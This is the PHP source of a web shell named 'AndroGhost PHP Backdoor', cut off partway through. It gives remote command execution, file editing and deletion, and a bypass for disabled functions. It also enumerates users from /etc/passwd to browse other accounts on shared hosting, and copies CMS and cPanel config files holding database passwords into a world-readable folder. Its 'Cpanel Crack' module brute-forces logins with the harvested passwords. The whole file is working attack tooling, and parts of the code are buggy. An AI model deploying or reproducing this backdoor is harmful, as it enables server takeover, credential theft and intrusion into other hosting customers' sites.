<?php
error_reporting(0);
function exect($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$exect = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $exect; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$exect = ""; 		
		foreach($results as $result) { 			
			$exect .= $result; 		
		} return $exect; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$exect = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $exect; 	
	} elseif(function_exists('shell_exec')) { 		
		$exect = @shell_exec($cmd); 		
		return $exect; 	
	} 
}


function fperms($filen) {
$perms = fileperms($filen);
$fpermsinfo .= (($perms & 0x0100) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0080) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
$fpermsinfo .= (($perms & 0x0020) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0010) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
$fpermsinfo .= (($perms & 0x0004) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0002) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
echo '<center><small>'.$fpermsinfo.'</small></center>';
}

?>
<title>AndroGhost PHP Backdoor</title>
<link href='//fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'>
<style type="text/css">
	body {
		color: #c73c3c;
		font-family: courier;
		background: #132d33;
		font-size: 1px;
	}
	h1 a {
		font-weight: normal;
		font-family: 'Share Tech Mono';
		font-size: 20px;
		color:#c73c3c;
		text-decoration: none;
		margin: 0px;
	}
	h2 {
		font-size: 20px;
		color: #c73c3c;
		text-align: center;
		padding-top: 5px;
		margin: 0;
		margin-top: 10px;
	}
	.menu {
		text-align: center;
		font-size: 12px;
		border-bottom: 1px dashed #006600;
		padding-bottom: 5px;
		margin-bottom: 10px;
	}
	.menu a {
		margin-top: 2px;
		color: #006600;
		text-decoration: none;
		display: inline-block;
	}
	.container {
		font-size: 12px;
	}
	.filemgr {
		font-size: 12px;
		width: 100%
	}
	.filemgr td {
		padding: 3px;
		border-bottom: 1px dashed #006600;
	}
	.filemgr a{
		text-decoration: none;
		color:#006600;
	}
	tr:hover {
		background: #cccccc;
	}
	.tdtl {
		background:#006600;color:#ffffff;text-align:center;font-weight:bold;
	}
	.footer {
		text-align: center;
		border-radius: 30px;
		margin-top: 25px;
		border-top: 1px double #006600;
		padding: 5px;
	}
	.footer a {
		color: #006600;
		text-decoration: none;
	}
	p {
    	word-wrap: break-word;
    	margin:2;
	}
	a {
		text-decoration: none;
		color: #006600;
	}
	.act {
		text-align: center;
	}
	.txarea {
		width:100%;
		height:200px;
		background:transparent;
		border:1px solid #006600;
		padding:1px;color:#006600;
	}
</style>
<div class="container">
<div style="position:relative;width: 100%;margin-bottom: 5px;border-bottom: 1px dashed #006600;">
	<div style="float: left;width: 15%;text-align: center;border: 1px dashed #006600;margin-bottom: 5px;">
	<h1><a href="?">./Xi4u7 & AndroGhost<br><small>V 1.5 (Beta)</small></a></h1>
	</div>
	<div style="float: right;width: 83%;">
	<?php
		echo php_uname();
		$mysql = (function_exists('mysql_connect')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$curl = (function_exists('curl_version')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$wget = (exect('wget --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$perl = (exect('perl --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$gcc = (exect('gcc --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$disfunc = @ini_get("disable_functions");
		$show_disf = (!empty($disfunc)) ? "<font color=red>$disfunc</font> <a href='?bypass=killdiscfunc' style='text-decoration:none;color:#0000FF;font-weight: bold;'>[ KILL ME ]</a>" : "<font color=#006600>NONE</font>";
		echo '<br>[ MySQL: '.$mysql.' ][ Curl: '.$curl.' ][ Wget: '.$wget.' ][ Perl: '.$perl.' ][ Compiler: '.$gcc.' ]';
		echo '<p>Disable Function: '.$show_disf;


	?>
	</div>
	<div style="clear: both;" ="clear"></div>
</div>

<?php

if(empty($_GET)) {
	$dir = getcwd();
}
else {
	$dir = $_GET['path'];
}

if(!empty($_GET['path'])) {$offdir = $_GET['path'];}
else if(!empty($_GET['file'])) {$offdir = dirname($_GET['file']);}
else if(!empty($_GET['lastpath'])) {$offdir = $_GET['lastpath'];}
else {$offdir = getcwd();}

?>
<div class="menu">
<a href="?=<?php echo $offdir;?>">[ Home ]</a>
<a href="?ext=jump&lastpath=<?php echo $offdir;?>">[ Jumping ]</a>
<a href="?ext=scupdate&lastpath=<?php echo $offdir;?>">[ Jumping2 ]</a>
<a href="?ext=fantastico&lastpath=<?php echo $offdir;?>">[ Jumping3 ]</a>
<a href="?ext=autoedt&lastpath=<?php echo $offdir;?>">[Auto Edit User ]</a>
<a href="?ext=prvconf&lastpath=<?php echo $offdir;?>">[ Priv8 Get Config By AndroGhost ]</a>
<a href="?ext=sql_interface&lastpath=<?php echo $offdir;?>">[ MySQL Interface ]</a>
<a href="?ext=shellcmd&lastpath=<?php echo $offdir;?>">[ Shell Command ]</a>
<a href="?ext=uploader&lastpath=<?php echo $offdir;?>">[ Uploader ]</a>
<a href="?ext=cpcrack&lastpath=<?php echo $offdir;?>">[ Cpanel Crack ]</a>
</div>
<?php
## CURRENT DIR ##

echo '<div style="margin-bottom:10px;">';
echo '<span style="border:1px dashed #009900;padding:2px;">';
$lendir = str_replace("\\","/",$offdir);
$xlendir = explode("/", $lendir);
foreach($xlendir as $c_dir => $cdir) {	
	echo "<a href='?path=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $xlendir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo '</span></div>';
## EOF CURRENT DIR ##

if(!empty($dir)) {
echo '<table class="filemgr">';
echo '<tr><td class="tdtl">Name</td><td class="tdtl" width="9%">Permission</td><td class="tdtl" width="18%">Action</td></tr>'."\n";
$directories = array();
$files_list  = array();
$files = scandir($dir);
foreach($files as $file){
   if(($file != '.') && ($file != '..')){
      if(is_dir($dir.'/'.$file)){
         $directories[] = $file;

      } else{
         $files_list[] = $file;

      }
   }
}

foreach($directories as $directory){
	echo '<tr><td><span class="dbox">[D]</span> <a href="?path='.$dir.'/'.$directory.'">'.$directory.'/</a></td>'."\n";
	echo '<td>';
	fperms($dir.'/'.$directory);
	echo '</td>'."\n";
	echo '<td class="act">';
	echo '<a href="?action=rename&file='.$dir.'/'.$directory.'" class="act">RENAME</a> ';
	echo '<a href="?action=rmdir&file='.$dir.'/'.$directory.'" class="act">DELETE</a>';
	echo '</td>'."\n";
	echo '</tr>'."\n";
}
foreach($files_list as $filename){
	if(preg_match('/(php)$/', $filename)) {
		echo '<tr><td><span class="dbox">[F]</span> <a href="#" class="act">'.$filename.'</a>'."\n";
		echo ' <a href="?ext=movecfg&cfg='.$dir.'/'.$filename.'" style="background:#006600;color:#ffffff;padding:1px;padding-left:5px;padding-right:5px;">MOVE CONFIG</a>';
		echo '</td>'."\n";
		echo '<td>';
		fperms($dir.'/'.$filename);
		echo '</td>'."\n";
		echo '<td class="act">';
		echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
		echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
		echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
		echo '</td>'."\n";
		echo '</tr>'."\n";
	} 
	else if(preg_match('/(tar.gz|tgz)$/', $filename)) {
		echo '<tr><td><span class="dbox">[F]</span> <a href="#" class="act">'.$filename.'</a>'."\n";
		echo ' <a href="?ext=extract2tmp&gzname='.$dir.'/'.$filename.'" style="background:#006600;color:#ffffff;padding:1px;padding-left:5px;padding-right:5px;">EXTRACT TO TMP</a>';
		echo '</td>'."\n";
		echo '<td>';
		fperms($dir.'/'.$filename);
		echo '</td>'."\n";
		echo '<td class="act">';
		echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
		echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
		echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
		echo '</td>'."\n";
		echo '</tr>'."\n";
	} 
	else {
		echo '<tr><td><span class="dbox">[F]</span> <a href="?action=view&file='.$dir.'/'.$filename.'" class="act">'.$filename.'</a></td>'."\n";
		echo '<td>';
		fperms($dir.'/'.$filename);
		echo '</td>'."\n";
		echo '<td class="act">';
		echo '<a href="?action=edit&file='.$dir.'/'.$filename.'" class="act">EDIT</a> ';
		echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
		echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
		echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
		echo '</td>'."\n";
		echo '</tr>'."\n";
	}
}
echo '</table>';
}

if($_GET['action'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=#006600>Successed!</font>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<form method='post'>
	<textarea name='src' class='txarea'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 20%;background:#006600;border:none;color:#f2f2f2;margin-top:5px;height:30px;'>
	</form>";
}
else if($_GET['action'] == 'view') {
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<textarea class='txarea' style='height:400px;' readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
}
else if($_GET['action'] == 'rename') {
	$path = $offdir;
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$path/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<font color=#006600>Successed!</font>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
}
else if($_GET['action'] == 'delete') {
	$path = $offdir;
	$delete = unlink($_GET['file']);
	if($delete) {
		
	} else {
		$act = "<font color=red>Permission Denied!</font>";
	}
	echo $act;
} else if($_GET['action'] == 'rmdir') {
	$path = $offdir;
	$delete = rmdir($_GET['file']);
	if($delete) {
		echo '<font color=#006600>Deleted!</font><br>';
	} else {
		echo "\n<font color=#006600>Try Force Delete!</font>\n<br>";
		exect('rm -rf '.$_GET['file']);
		if(file_exists($_GET['file'])) {
			echo '<font color=red>Permission Denied!</font>';
		} else
		{
			echo '<font color=#006600>Deleted!</font>';
		}
	}

} else if($_GET['action'] == 'download') {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.$file.'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}

if($_GET['ext'] == 'scupdate') {
	echo '<h2>.::[ Jumping From Backup Scriptupdate ]::.</h2>';
		$i = 0;
		echo "<pre><div class='margin: 5px auto;'>";
		$etc = fopen("/etc/passwd", "r");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<center><font color=red>Can't read /etc/passwd</font></center>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user);
				foreach($user[1] as $users) {
					$user_dir = "/home/$users/scriptupdate";
					if(is_readable($user_dir)) {
						$i++;
						$jrw = "[R] <a href='?path=$user_dir'>/home/$users/scriptupdate</a>";
						if(is_writable($user_dir)) {
							$jrw = "[RW] <a href='?path=$user_dir'>/home/$users/scriptupdate</a>";
						}
						echo $jrw."\n";
					}
				}
			}
		}
		if($i == 0) { 
			echo '<center><font color=red>scriptupdate is null in this host!</font></center>';
		} else {
			echo "<br>Total ".$i." Users in ".gethostbyname($_SERVER['HTTP_HOST'])."";
		}
		echo "</div></pre>";
}

if($_GET['ext'] == 'fantastico') {
	echo '<h2>.::[ Jumping From Backup Fantastico ]::.</h2>';
		$i = 0;
		echo "<pre><div class='margin: 5px auto;'>";
		$etc = fopen("/etc/passwd", "r");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<center><font color=red>Can't read /etc/passwd</font></center>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user);
				foreach($user[1] as $users) {
					$user_dir = "/home/$users/fantastico_backups";
					if(is_readable($user_dir)) {
						$i++;
						$jrw = "[R] <a href='?path=$user_dir'>/home/$users/fantastico_backups</a>";
						if(is_writable($user_dir)) {
							$jrw = "[RW] <a href='?path=$user_dir'>/home/$users/fantastico_backups</a>";
						}
						echo $jrw."\n";
					}
				}
			}
		}
		if($i == 0) { 
			echo '<center><font color=red>scriptupdate is null in this host!</font></center>';
		} else {
			echo "<br>Total ".$i." Users in ".gethostbyname($_SERVER['HTTP_HOST'])."";
		}
		echo "</div></pre>";
}

if($_GET['ext'] == 'cpcrack') {
if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>IndoXploit.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					$pass .= $pass1[1]."\n";
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
}

if($_GET['ext'] == 'prvconf') {
	echo '<h2>.::[ Get Config Private By AndroGhost ]::.</h2>';
$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$idx = mkdir("idx_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("idx_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_idx) {
				$user_config_dir = "/home/$user_idx/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_idx/.my.cnf" => "cpanel",
						"/home/$user_idx/public_html1/wp-config.php" => "Wordpress",
						"/home/$user_idx/public_html1/configuration.php" => "Joomla",
						"/home/$user_idx/.accesshash" => "WHM-accesshash",
						"/home/$user_idx/vdo_config.php" => "Voodoo",
						"/home/$user_idx/bw-configs/config.ini" => "BosWeb",
						"/home/$user_idx/config/koneksi.php" => "Lokomedia",
						"/home/$user_idx/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_idx/clientarea/configuration.php" => "WHMCS",
						"/home/$user_idx/whm/configuration.php" => "WHMCS",
						"/home/$user_idx/whmcs/configuration.php" => "WHMCS",
						"/home/$user_idx/forum/config.php" => "phpBB",
						"/home/$user_idx/sites/default/settings.php" => "Drupal",
						"/home/$user_idx/config/settings.inc.php" => "PrestaShop",
						"/home/$user_idx/app/etc/local.xml" => "Magento",
						"/home/$user_idx/joomla/configuration.php" => "Joomla",
						"/home/$user_idx/configuration.php" => "Joomla",
						"/home/$user_idx/wp/wp-config.php" => "WordPress",
						"/home/$user_idx/wordpress/wp-config.php" => "WordPress",
						"/home/$user_idx/wp-config.php" => "WordPress",
						"/home/$user_idx/admin/config.php" => "OpenCart",
						"/home/$user_idx/slconfig.php" => "Sitelok",
						"/home/$user_idx/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?path=$path/idx_config'><font color=lime>Done</font></a></center>";
}

if($_GET['ext'] == 'jump') {
$list = scandir("/var/named");
foreach($list as $domain){
 if(strpos($domain,".db")){
  $domain = str_replace('.db','',$domain);
  $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
  $dir = '/home/'.$owner['name'].'/public_html1';
  $path = getcwd();
  
  if (is_readable($dir)) {
   echo "<font color='red'>[-]<a href='?path=$dir' target='_blank'><u>$dir</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dira = '/home/'.$owner['name'].'/backup-'.$owner['name'];
  if (is_readable($dira)) {
   echo "<font color='red'>[-]$dira</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirb = '/home/'.$owner['name'].'/public_html.bak/';
  if (is_readable($dirb)) {
   echo "<font color='red'>[-]<a href='?path=$dirb' target='_blank'><u>$dirb</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirc = '/home/'.$owner['name'].'/blog';
  if (is_readable($dirc)) {
   echo "<font color='red'>[-]<a href='?path=$dirc' target='_blank'><u>$dirc</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dird = '/home/'.$owner['name'].'/blogs';
  if (is_readable($dird)) {
   echo "<font color='red'>[-]<a href='?path=$dird' target='_blank'><u>$dird</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dire = '/home/'.$owner['name'].'/wordpress';
  if (is_readable($dire)) {
   echo "<font color='red'>[-]<a href='?path=$dire' target='_blank'><u>$dire</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirf = '/home/'.$owner['name'].'/sites';
  if (is_readable($dirf)) {
   echo "<font color='red'>[-]$dirf</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirg = '/home/'.$owner['name'].'/config';
  if (is_readable($dirg)) {
   echo "<font color='red'>[-]<a href='?path=$dirg' target='_blank'><u>$dirg</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirh = '/home/'.$owner['name'].'/backups_';
  if (is_readable($dirh)) {
   echo "<font color='red'>[-]<a href='?path=$dirh' target='_blank'><u>$dirh</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diri = '/home/'.$owner['name'].'/backups';
  if (is_readable($diri)) {
   echo "<font color='red'>[-]<a href='?path=$diri' target='_blank'><u>$diri</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirj = '/home/'.$owner['name'].'/Backup';
  if (is_readable($dirj)) {
   echo "<font color='red'>[-]<a href='?path=$dirj' target='_blank'><u>$dirj</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirk = '/home/'.$owner['name'].'/public_html.zip';
  if (is_readable($dirk)) {
   echo "<font color='red'>[-]<a href='?path=$dirk' target='_blank'><u>$dirk</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirl = '/home/'.$owner['name'].'/staging';
  if (is_readable($dirl)) {
   echo "<font color='red'>[-]<a href='?path=$dirl' target='_blank'><u>$dirl</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirm = '/home/'.$owner['name'].'/'.$domain;
  if (is_readable($dirm)) {
   echo "<font color='red'>[-]<a href='?path=$dirm' target='_blank'><u>$dirm</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirn = '/home/'.$owner['name'].'/'.$owner['name'];
  if (is_readable($dirn)) {
   echo "<font color='red'>[-]<a href='?path=$dirn' target='_blank'><u>$dirn</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diro = '/home/'.$owner['name'].'/'.$owner['name']-backups;
  if (is_readable($diro)) {
   echo "<font color='red'>[-]$diro</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirp = '/home/'.$owner['name'].'/BackWPup';
  if (is_readable($dirp)) {
   echo "<font color='red'>[-]<a href='?path=$dirv' target='_blank'><u>$dirv</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirq = '/home/'.$owner['name'].'/_backup';
  if (is_readable($dirq)) {
   echo "<font color='red'>[-]$dirq</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirr = '/home/'.$owner['name'].'/bak';
  if (is_readable($dirr)) {
   echo "<font color='red'>[-]<a href='?path=$dirr' target='_blank'><u>$dirr</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirs = '/home/'.$owner['name'].'/wp_backup';
  if (is_readable($dirs)) {
   echo "<font color='red'>[-]$dirs</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirt = '/home/'.$owner['name'].'/wp_backups';
  if (is_readable($dirt)) {
   echo "<font color='red'>[-]<a href='?path=$dirt' target='_blank'><u>$dirt</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diru = '/home/'.$owner['name'].'/public_html.older/';
  if (is_readable($diru)) {
   echo "<font color='red'>[-]$diru</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirv = '/home/'.$owner['name'].'/db';
  if (is_readable($dirv)) {
   echo "<font color='red'>[-]<a href='?path=$dirv' target='_blank'><u>$dirv</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirw = '/home/'.$owner['name'].'/database';
  if (is_readable($dirw)) {
   echo "<font color='red'>[-]<a href='?path=$dirw' target='_blank'><u>$dirw</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirx = '/home/'.$owner['name'].'/homedir';
  if (is_readable($dirx)) {
   echo "<font color='red'>[-]<a href='?path=$dirx' target='_blank'><u>$dirx</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diry = '/home/'.$owner['name'].'/backup_1';
  if (is_readable($diry)) {
   echo "<font color='red'>[-]$diry</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirz = '/home/'.$owner['name'].'/backup_public_html';
  if (is_readable($dirz)) {
   echo "<font color='red'>[-]$dirz</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirza = '/home/'.$owner['name'].'/BackupBuddy';
  if (is_readable($dirza)) {
   echo "<font color='red'>[-]<a href='?path=$dirza' target='_blank'><u>$dirza</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzb = '/home/'.$owner['name'].'/backup1';
  if (is_readable($dirzb)) {
   echo "<font color='red'>[-]<a href='?path=$dirzb' target='_blank'><u>$dirzb</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzc = '/home/'.$owner['name'].'/wpbackup';
  if (is_readable($dirzc)) {
   echo "<font color='red'>[-]$dirzc</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzd = '/home/'.$owner['name'].'/wp-upgrade-backup';
  if (is_readable($dirzd)) {
   echo "<font color='red'>[-]<a href='?path=$dirzd' target='_blank'><u>$dirzd</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirze = '/home/'.$owner['name'].'/website_backup';
  if (is_readable($dirze)) {
   echo "<font color='red'>[-]<a href='?path=$dirze</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzf = '/home/'.$owner['name'].'/BACKUP';
  if (is_readable($dirzf)) {
   echo "<font color='red'>[-]<a href='?path=$dirzf' target='_blank'><u>$dirzf</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzg = '/home/'.$owner['name'].'/quarantine';
  if (is_readable($dirzg)) {
   echo "<font color='red'>[-]<a href='?path=$dirzg' target='_blank'><u>$dirzg</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzh = '/home/'.$owner['name'].'/backup2';
  if (is_readable($dirzh)) {
   echo "<font color='red'>[-]<a href='?path=$dirzh' target='_blank'><u>$dirzh</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzi = '/home/'.$owner['name'].'/new';
  if (is_readable($dirzi)) {
   echo "<font color='red'>[-]<a href='?path=$dirzi' target='_blank'><u>$dirzi</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzj = '/home/'.$owner['name'].'/MyBackup';
  if (is_readable($dirzj)) {
   echo "<font color='red'>[-]$dirzj</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzk = '/home/'.$owner['name'].'/mybackup';
  if (is_readable($dirzk)) {
   echo "<font color='red'>[-]$dirzk</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzl = '/home/'.$owner['name'].'/backups1';
  if (is_readable($dirzl)) {
   echo "<font color='red'>[-]<a href='?path=$dirzl' target='_blank'><u>$dirzl</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzm = '/home/'.$owner['name'].'/backups2';
  if (is_readable($dirzm)) {
   echo "<font color='red'>[-]<a href='?path=$dirzm' target='_blank'><u>$dirzm</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzn = '/home/'.$owner['name'].'/scriptupdate1';
  if (is_readable($dirzn)) {
   echo "<font color='red'>[-]$dirzn</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzo = '/home/'.$owner['name'].'/scriptupdate2';
  if (is_readable($dirzo)) {
   echo "<font color='red'>[-]$dirzo</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzp = '/home/'.$owner['name'].'/cobian_backups';
  if (is_readable($dirzp)) {
   echo "<font color='red'>[-]$dirzp</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzq = '/home/'.$owner['name'].'/fantastico_backups1';
  if (is_readable($dirzq)) {
   echo "<font color='red'>[-]<a href='?path=$dirzq' target='_blank'><u>$dirzq</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzr = '/home/'.$owner['name'].'/cobian_backup';
  if (is_readable($dirzr)) {
   echo "<font color='red'>[-]<a href='?path=$dirzr' target='_blank'><u>$dirzr</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzs = '/home/'.$owner['name'].'/application_backups';
  if (is_readable($dirzs)) {
   echo "<font color='red'>[-]<a href='?path=$dirzs' target='_blank'><u>$dirzs</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzt = '/home/'.$owner['name'].'/public_html/';
  if (is_readable($dirzt)) {
